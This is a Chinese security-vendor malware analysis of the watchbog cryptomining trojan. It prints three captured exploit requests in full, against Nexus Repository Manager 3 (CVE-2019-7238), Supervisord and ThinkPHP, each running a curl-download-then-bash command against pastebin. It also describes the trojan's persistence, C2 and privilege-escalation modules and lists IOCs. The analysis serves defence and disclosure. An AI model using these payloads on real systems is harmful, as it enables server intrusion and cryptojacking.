***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 背景

 **近日，阿里云安全监测到watchbog挖矿木马使用新曝光的Nexus Repository Manager
3远程代码执行漏洞(CVE-2019-7238)进行攻击并挖矿的事件。**

值得注意的是，这一攻击开始的时间（2月24日）与2月5日上述产品的母公司发布漏洞公告相隔仅仅半个多月，再次印证了“漏洞从曝光到被黑产用于挖矿的时间越来越短”。此外，攻击者还利用了Supervisord、ThinkPHP等产品的漏洞进行攻击。

本文分析了该木马的内部结构和传播方式，并就如何清理、预防类似挖矿木马给出了安全建议。

## 挖矿木马传播分析

攻击者主要通过直接攻击主机服务的漏洞来进行木马的传播，也就是说它目前不具备蠕虫的传染性，这一点上类似8220团伙。即便如此，攻击者仍然获取了大量的肉鸡。

尤其2月24日，攻击者从原本只攻击ThinkPHP和Supervisord，到加入了Nexus Repository Manager
3的攻击代码，可以看到其矿池算力当天即飙升约3倍，达到了210KH/s左右（盈利约25美元/天），意味着最高时可能有1~2万台主机受控进行挖矿。

![](https://image.3001.net/images/20190304/1551681467_5c7cc7bb28e4c.png!small)

以下为阿里云安全采集到的3种攻击payload：

### （1）针对Nexus Repository Manager 3远程代码执行漏洞(CVE-2019-7238)的利用

    
    
    POST /service/extdirect HTTP/1.1
    
    Host: 【victim_ip】:8081
    
    X-Requested-With: XMLHttpRequest
    
    Content-Type: application/json
    
    {"action": "coreui_Component", "type": "rpc", "tid": 8, "data": [{"sort": [{"direction": "ASC", "property": "name"}], "start": 0, "filter": [{"property": "repositoryName", "value": "*"}, {"property": "expression", "value": "233.class.forName('java.lang.Runtime').getRuntime().exec('curl -fsSL <https://pastebin.com/raw/zXcDajSs> -o /tmp/baby')"}, {"property": "type", "value": "jexl"}], "limit": 50, "page": 1}], "method": "previewAssets"}

### （2）针对Supervisord远程命令执行漏洞(CVE-2017-11610)的利用

    
    
    POST /RPC2 HTTP/1.1
    
    Host: 【victim_ip】:9001
    
    Content-Type:application/x-www-form-urlencoded
    
    <?xml version=\"1.0\"?>\u0002<methodCall>\u0002<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>\u0002<params>\u0002<param>\u0002<string>curl <https://pastebin.com/raw/zXcDajSs> -o /tmp/baby</string>\u0002</param>\u0002</params>\u0002</methodCall>

### （3）针对ThinkPHP远程命令执行漏洞的利用

    
    
    POST /index.php?s=captcha HTTP/1.1
    
    Host: 【victim_host】
    
    Content-Type:application/x-www-form-urlencoded
    
    _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=curl -fsSL <https://pastebin.com/raw/zXcDajSs> -o /tmp/baby; bash /tmp/baby

以上三种payload的目的都是相同的，那就是控制主机执行以下命令：

    
    
    curl -fsSL <https://pastebin.com/raw/zXcDajSs> -o /tmp/baby; bash /tmp/baby

## 木马功能结构分析

![](https://image.3001.net/images/20190304/1551681493_5c7cc7d5a0d90.png!small)

被攻击的主机受控访问<https://pastebin.com/raw/zXcDajSs>，经多次跳转后，会得到如下图所示的shell脚本，其包含cronlow(),
cronhigh(), flyaway()等多个函数。

![](https://image.3001.net/images/20190304/1551681510_5c7cc7e66f69c.png!small)

分析后得出，该脚本主要包含以下几个模块：

### 1\. 挖矿模块

![](https://image.3001.net/images/20190304/1551681525_5c7cc7f56fc49.png!small)

挖矿模块的download()函数，会从<https://ptpb.pw/D8r9>（即$mi_64解码后的内容）下载由xmrig改写的挖矿程序，保存为/tmp/systemd-private-afjdhdicjijo473skiosoohxiskl573q-systemd-timesyncc.service-g1g5qf/cred/fghhhh/data/watchbog，并从<https://ptpb.pw/hgZI>下载配置文件，之后启动挖矿。

另一个函数testa()也是类似，只不过它下载的是xmr-stak挖矿程序。

### 2\. 持久化模块

将要执行的恶意命令写入/etc/cron.d/root等多个文件：

![](https://image.3001.net/images/20190304/1551681546_5c7cc80a6a4a9.png!small)

### 3\. c&c模块

c&c模块主要在dragon()和flyaway()函数中实现。

![](https://image.3001.net/images/20190304/1551681561_5c7cc819271ad.png!small)

如下图所示为解码后的dragon函数：

![](https://image.3001.net/images/20190304/1551681576_5c7cc828a8d60.png!small)

它会依次请求<https://pastebin.com/raw/05p0fTYd>等多个地址，并执行收到的命令。有趣的是，这些地址目前存放的都是一些普通单词，可能是木马作者留待将来使用。

flyaway()函数则与dragon()稍有不同，它会先从<https://pixeldra.in/api/download/8iFEEg>下载/tmp/elavate。

![](https://image.3001.net/images/20190304/1551681590_5c7cc8360fe52.png!small)

逆向可知，/tmp/elavate是使用Ubuntu本地权限提升漏洞(CVE-2017-16995)进行提权的二进制程序。提权后，尝试以root权限执行从<https://pastebin.com/raw/aGTSGJJp>获取的命令。

![](https://image.3001.net/images/20190304/1551681603_5c7cc843bde48.png!small)

![](https://image.3001.net/images/20190304/1551681611_5c7cc84bf1542.png!small)

## 安全建议

阿里云安全已和pastebin.com进行联系，要求禁止对上述恶意下载链接的访问，对方暂未回应。此外，云安全为用户提供如下安全建议：

互联网上攻击无处不在，用户平时应及时更新服务，或修补服务漏洞，避免成为入侵的受害者。

## IOC

### 矿池地址：

    
    
    pool.minexmr.com:443
    
    钱包地址：44gaihcvA4DHwaWoKgVWyuKXNpuY2fAkKbByPCASosAw6XcrVtQ4VwdHMzoptXVHJwEErbds66L9iWN6dRPNZJCqDhqni3B

### 相关文件：

文件名 | md5 | 下载url  
---|---|---  
baby | cae4d99d60e23952d2f64fbd37129ed8 |
<https://pastebin.com/raw/zXcDajSs>（执行后即被删除）  
watchbog | 314097a1d41697352c961026aa1ed87c | <https://ptpb.pw/D8r9>(XMR
miner)  
watchbog | 1dbd97c70a89e64cbfb65c78ac39938e | <https://ptpb.pw/mNJt>(BTC
miner)  
config.json | 1f03df0839a4cb2fdcea6affdacc3d4a | <https://ptpb.pw/hgZI> （需解码）  
elavate | 157495f6ba8c36c38984d1f902cf3ac0 |
<https://pixeldra.in/api/download/8iFEEg>（提权程序）  
config.txt | 68a3a77f0d148ff7c9058d6a86258e14 | <https://ptpb.pw/KAlo>  
cpu.txt | f9c7920155aa6956e35e03656e261441 | <https://ptpb.pw/Nqo->  
pools.txt | c362e9b475761815984f315a191c0421 | <https://ptpb.pw/DXpq>  
  
### 其他恶意url：

> <https://pastebin.com/raw/AgdgACUD>
>
> <https://pastebin.com/raw/vvuYb1GC>
>
> <https://pixeldra.in/api/download/nZ2s4L> (用来下载32位XMR挖矿程序，链接已失效)
>
> <https://pastebin.com/raw/aGTSGJJp>（目前不存在）
>
> <https://pastebin.com/raw/05p0fTYd>
>
> <https://pastebin.com/raw/KxWPFeEn>
>
> <https://pastebin.com/raw/X6wvuv98>

## Reference

> <https://support.sonatype.com/hc/en-> us/articles/360017310793-CVE-2019-7238-Nexus-Repository-Manager-3-Missing-> Access-Controls-and-Remote-Code-Execution-February-5th-2019>
>
> <https://cloud.tencent.com/developer/article/1390628>
>
> <https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c>

 ***本文作者：阿里云安全，转载请注明来自FreeBuf.COM**

